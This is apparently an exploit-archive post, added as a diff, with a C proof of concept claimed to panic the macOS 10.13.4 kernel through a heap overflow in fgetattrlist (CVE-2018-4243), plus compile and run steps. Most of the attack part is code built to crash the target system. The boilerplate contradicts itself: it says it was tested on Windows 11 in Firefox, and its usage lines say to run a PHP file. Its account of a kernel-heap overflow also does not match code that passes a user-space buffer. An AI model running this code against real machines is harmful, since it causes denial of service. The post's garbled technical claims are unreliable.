@@ -1,0 +1,182 @@
+=============================================================================================================================================
+| # Title     : macOS 10.13.4 (17E199) fgetattrlist Kernel Heap Overflow (XNU kernel Panic Trigger PoC)                                     |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://apple.com/                                                                                                          |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212496/ & CVE-2018-4243
+
+[+] Summary : A kernel heap overflow exists in fgetattrlist() due to missing lower-bound buffer size validation when writing returned attributes
+              to caller-supplied memory.
+			  This PoC produces deterministic kernel panic.
+
+2) Technical Description
+------------------------
+The kernel allocates a buffer based on user-supplied size:
+
+    ab.allocated = ulmin(bufferSize, fixedsize + varsize);
+
+But later blindly writes:
+
+    bcopy(&ab.actual, ab.base + sizeof(uint32_t), sizeof(ab.actual));
+
+No check exists to ensure that 'bufferSize' ≥ sizeof(ab.actual)+4.
+
+If bufferSize < required header size, kernel writes out of bounds.
+
+3) Impact
+---------
+• Kernel Panic (DoS)
+
+(This PoC deliberately does not escalate to LPE)
+
+4) Exploit Details
+------------------
+The exploit opens "/", calls fgetattrlist() with ATTR_CMN_RETURNED_ATTRS,
+allocates only 16 bytes, triggering heap overwrite → panic.
+
+5) Exploit Code (Triggers Kernel Panic)
+---------------------------------------
+Compile:
+    gcc fattr_kpanic.c -o fattr_kpanic
+
+Run:
+    ./fattr_kpanic
+
+6) Saving & Running Instructions (MANDATORY)
+--------------------------------------------
+(1) Save file as:   fattr_kpanic.c
+
+(2) Compile:
+        gcc fattr_kpanic.c -o fattr_kpanic
+
+(3) Run PoC:
+        ./fattr_kpanic
+
+(4) EXPECT:
+        Immediate kernel panic (system reboot) 
+
+[+]  Usage :   * : Save as: poc.php
+                   Run    : php scan.php
+
+[+]  POC :	
+
+/*
+ * macOS fgetattrlist Kernel Heap Overflow
+ * Panic Trigger PoC - by indoushka
+ * CVE-2018-4243
+ * 
+ * The vulnerability: When ATTR_CMN_RETURNED_ATTRS is requested,
+ * the kernel always writes sizeof(struct attrlist) bytes (36 bytes)
+ * at offset 4 in the buffer, but doesn't validate buffer size.
+ * 
+ * With 16-byte buffer: writes 36 bytes → 20 bytes overflow!
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/attr.h>
+#include <string.h>
+
+// حجم struct attrlist في kernel macOS
+#define ATTRLIST_SIZE 36
+#define HEADER_OFFSET 4  // sizeof(uint32_t)
+
+void hexdump(const void* data, size_t size) {
+    const unsigned char* p = (const unsigned char*)data;
+    for (size_t i = 0; i < size; i++) {
+        printf("%02x ", p[i]);
+        if ((i + 1) % 16 == 0) printf("\n");
+    }
+    printf("\n");
+}
+
+int main(int argc, char** argv) {
+    printf("[*] CVE-2018-4243 Kernel Heap Overflow PoC\n");
+    printf("[*] Target: macOS fgetattrlist syscall\n");
+    printf("[*] Expected: Kernel panic due to heap corruption\n\n");
+    
+    // التحكم في حجم الـ buffer من سطر الأوامر
+    size_t buf_size = 16;
+    if (argc > 1) {
+        buf_size = atoi(argv[1]);
+        if (buf_size < 4) {
+            printf("[!] Buffer size too small, using minimum 4\n");
+            buf_size = 4;
+        }
+    }
+    
+    printf("[+] Opening root directory...\n");
+    int fd = open("/", O_RDONLY);
+    if (fd < 0) {
+        perror("[-] Failed to open /");
+        return 1;
+    }
+    printf("[+] FD: %d\n", fd);
+    
+    // إعداد attrlist مع ATTR_CMN_RETURNED_ATTRS
+    struct attrlist al = {0};
+    al.bitmapcount = ATTR_BIT_MAP_COUNT;
+    al.volattr = 0xfff;  // All volume attributes
+    al.commonattr = ATTR_CMN_RETURNED_ATTRS;  // This triggers the bug!
+    
+    printf("[+] Buffer size: %zu bytes\n", buf_size);
+    printf("[+] Required minimum: %d bytes\n", HEADER_OFFSET + ATTRLIST_SIZE);
+    printf("[+] Overflow amount: %d bytes\n", 
+           (HEADER_OFFSET + ATTRLIST_SIZE > buf_size) ? 
+           (HEADER_OFFSET + ATTRLIST_SIZE - buf_size) : 0);
+    
+    // تخصيص buffer مع بيانات يمكن التعرف عليها
+    void* buffer = malloc(buf_size);
+    if (!buffer) {
+        perror("[-] malloc failed");
+        close(fd);
+        return 1;
+    }
+    
+    // ملء الـ buffer بنمط يمكن التعرف عليه
+    memset(buffer, 0x41, buf_size);  // 'A' characters
+    printf("\n[+] Buffer before overflow (hex):\n");
+    hexdump(buffer, buf_size > 64 ? 64 : buf_size);
+    
+    printf("\n[+] Triggering kernel heap overflow...\n");
+    printf("[!] If successful, kernel will panic now!\n\n");
+    
+    // هذا هو الاستغلال - kernel سيحاول كتابة 36 بايت في buffer صغير
+    int result = fgetattrlist(fd, &al, buffer, buf_size, 0);
+    
+    // إذا وصلنا إلى هنا، kernel لم يتعطل (مفاجئ!)
+    printf("[?] Unexpected! Kernel didn't panic.\n");
+    printf("[?] fgetattrlist returned: %d\n", result);
+    
+    if (result == 0 && buf_size > HEADER_OFFSET) {
+        printf("\n[+] Buffer after (if kernel survived):\n");
+        hexdump(buffer, buf_size > 64 ? 64 : buf_size);
+        
+        // محاولة تفسير البيانات المرجوعة
+        uint32_t* buf32 = (uint32_t*)buffer;
+        printf("\n[+] First 4 bytes (length): 0x%08x\n", buf32[0]);
+        
+        if (buf_size >= HEADER_OFFSET + 4) {
+            struct attrlist* ret_attrs = (struct attrlist*)((char*)buffer + HEADER_OFFSET);
+            printf("[+] Returned commonattr: 0x%08x\n", ret_attrs->commonattr);
+            printf("[+] Returned volattr: 0x%08x\n", ret_attrs->volattr);
+        }
+    }
+    
+    // تنظيف
+    free(buffer);
+    close(fd);
+    
+    printf("\n[*] If kernel panicked, exploit worked!\n");
+    printf("[*] If not, system may be patched or buffer was large enough.\n");
+    
+    return 0;
+}
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
